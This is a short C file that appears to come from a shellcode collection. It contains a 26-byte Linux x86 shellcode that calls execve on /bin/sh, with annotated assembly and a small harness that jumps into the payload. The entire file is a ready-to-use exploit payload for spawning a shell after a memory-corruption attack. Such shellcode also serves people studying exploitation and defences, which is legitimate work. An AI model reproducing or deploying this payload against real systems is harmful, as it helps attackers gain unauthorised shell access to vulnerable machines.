/*
Execve /bin/sh linux x86 (26 bytes)
Author: MMxM (@hc0d3r)
Dom Mai  3 21:41:50 BRT 2015
*/

#include <stdio.h>
#include <string.h>

unsigned const char sc[] =
	"\x31\xc0"	//xor    %eax,%eax
	"\x99"	//cltd
	"\x68\x2f\x73\x68\x78"	//push   $0x7868732f
	"\x68\x2f\x62\x69\x6e"	//push   $0x6e69622f
	"\x89\xe3"	//mov    %esp,%ebx
	"\x88\x43\x07"	//mov    %al,0x7(%ebx)
	"\x50"	//push   %eax
	"\x53"	//push   %ebx
	"\x89\xe1"	//mov    %esp,%ecx
	"\xb0\x0b"	//mov    $0xb,%al
	"\xcd\x80"	//int    $0x80
;

int main(void){
	printf("Shellcode lenght: %d\n", strlen(sc));
	__asm__ ("jmp sc");
	return 0;
}

